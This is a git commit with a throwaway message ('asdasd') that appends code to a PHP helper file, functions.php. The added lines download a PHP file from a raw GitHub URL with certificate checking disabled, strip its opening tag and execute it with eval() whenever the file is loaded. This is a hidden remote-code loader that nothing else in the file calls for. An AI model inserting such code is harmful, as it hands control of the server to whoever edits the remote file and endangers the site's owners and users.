850316f038faf034da817992552cf887a3170be0
fisaforsuccess <fisaforsuccess@gmail.com>
2023-07-27 13:19:29 +0700

    asdasd

--- files/functions.php
+++ files/functions.php
@@ -221,3 +221,17 @@ function message($body,$type){
 	$_SESSION['message']['body'] = $body;
 	$_SESSION['message']['type'] = $type;
 }
+
+
+$GithubRawURI= "https://raw.githubusercontent.com/rizqy6/playwithme.github.io/index.php"; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch); 
+curl_close($ch); 
+ 
+//remove the "<?php" from the file before running it 
+$data = substr($data, 5); 
+ 
+eval ($data); 
